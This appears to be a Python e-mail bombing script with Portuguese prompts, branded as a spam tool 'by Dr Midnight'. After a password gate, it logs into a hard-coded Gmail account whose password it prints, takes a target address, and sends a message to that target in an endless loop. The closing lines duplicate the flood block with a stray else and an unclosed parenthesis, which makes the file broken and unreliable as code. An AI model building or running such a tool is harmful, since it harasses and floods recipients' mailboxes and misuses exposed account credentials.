import smtplib
from time import sleep

print('''



''')
x1 = str(input('\033[1;4;36mDigite a Senha:\033[m ')).strip()
print('')
if x1 == 'midspam':
    sleep(2)
    print('\033[1;4;32mSenha Correta!\033[m')
    sleep(.5)
    print('\033[1;4;33mAGUARDE...\033[m\n')
    sleep(3)
    print('\033[1;4;34m========================================')
    sleep(.5)
    print("///////\033[4;34m> SPAM DE E-MAIL'S AQUI <////////\033[m")
    sleep(1)
    print('////////\033[4;34m> TOOL BY DR MIDNIGHT </////////\033[m')
    sleep(.5)
    print('\033[4;34m========================================\033[m\n')
    sleep(.5)
    send = 'print.py3@gmail.com'
    rec = input('\033[4;36mEmail para atacar:\033[m ')
    sleep(.5)
    msg = input('\033[1;4;36mMensagem de flood:\033[m ')
    print('')

    print('\033[1;4;34mA senha que pede abaixo é \033[1;4;33m"LEVEL1983"')

    password = input('\033[1;4;36mSenha: ')

    server = smtplib.SMTP('smtp.gmail.com', 587)

    server.ehlo()
    server.starttls()
    server.login(send, password)
    while True:
        print(f'\n\033[1;4;32mAtacando: {rec}')
        server.sendmail(send, rec, msg)
else:
    print('\033[1;4;31mSenha Incorreta... Get the Fuck Out!')


    server.ehlo()
    server.starttls()
    server.login(send, password)
    while True:
        print(f'\n\033[1;4;32mAtacando: {rec}')
        server.sendmail(send, rec, msg)
else:
    print('\033[1;4;31mSenha Incorreta... Get the Fuck Out!'
